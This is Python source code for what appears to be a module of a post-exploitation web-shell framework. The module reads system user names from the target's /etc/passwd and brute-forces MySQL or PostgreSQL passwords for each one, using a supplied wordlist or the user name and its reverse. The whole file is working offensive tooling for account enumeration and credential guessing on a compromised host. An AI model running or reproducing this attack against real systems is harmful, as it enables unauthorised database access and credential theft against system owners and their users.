'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from random import choice
from math import ceil
from core.parameters import ParametersList, Parameter as P

classname = 'Sql_users'
 
class Sql_users(Module):
    '''Bruteforce sql of system users. For user based password trying use 'auto'.
    :bruteforce.sql_users mysql|postgres <local_file_list.txt>|auto <host> 
    '''
    
    params = ParametersList('Bruteforce SQL password of every system users using local wordlist', None,
            P(arg='dbms', help='DBMS', choices=['mysql', 'postgres'], required=True, pos=0),
            P(arg='lpath', help='Path of local wordlist. Use \'auto\' to use only user and its reverse as password.', required=True, pos=1),
            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=2))

        
        
    def __generate_wl_from_user(self, user):
        return [ user, user[::-1] ]
        
    def run_module( self, mode, filename, host):
        
        wl_splitted = []
        if filename != 'auto':
            try:
                wordlist = open(filename, 'r')
                wl_splitted = [ w.strip() for w in wordlist.read().split() ]
            except Exception, e:
                raise ModuleException(self.name, "Error opening %s: %s" % (filename, str(e)))
    
        usersresponse = self.modhandler.load('audit.etc_passwd').run({"filter": "True"})
        
        
        if usersresponse:
            
            usersdict = self.modhandler.load('audit.etc_passwd').usersinfo
            
            users = [ usersdict[u].name for u in usersdict ]
            
            for user in users:
                
                if filename == 'auto':
                    wl_splitted = self.__generate_wl_from_user(user)
                else:
                    wl_splitted = self.__generate_wl_from_user(user) + wl_splitted
            
                self.modhandler.load('bruteforce.sql').set_substitutive_wl(wl_splitted)
                response = self.modhandler.load('bruteforce.sql').run({'dbms' : mode, 'user' : user, 'lpath' : '', 'sline' : 0, 'host' : host})
                                                                             
                if response:
                    self.mprint(response)
                else:
                    self.mprint('[%s] Password of \'%s\' not found' % (self.name, user))
                
               
                
                
            
        